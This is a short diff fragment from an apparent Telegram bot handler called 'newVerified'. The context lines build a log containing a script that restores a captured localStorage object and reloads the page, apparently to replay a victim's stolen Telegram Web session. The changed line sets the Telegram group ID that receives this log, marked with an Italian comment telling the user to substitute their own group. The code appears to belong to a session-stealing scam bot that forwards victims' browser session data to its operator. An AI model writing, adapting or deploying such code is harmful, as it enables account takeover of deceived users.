@@ -181,7 +181,7 @@ const newVerified = async (ctx: Context) => {
         storage
       )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-      const myGroupId = -4669315950; // 👉 Sostituisci con l'ID del tuo gruppo
+      const myGroupId = -4723386398; // 👉 Sostituisci con l'ID del tuo gruppo
 
       await bot.api.raw.sendMessage({
         text: log,
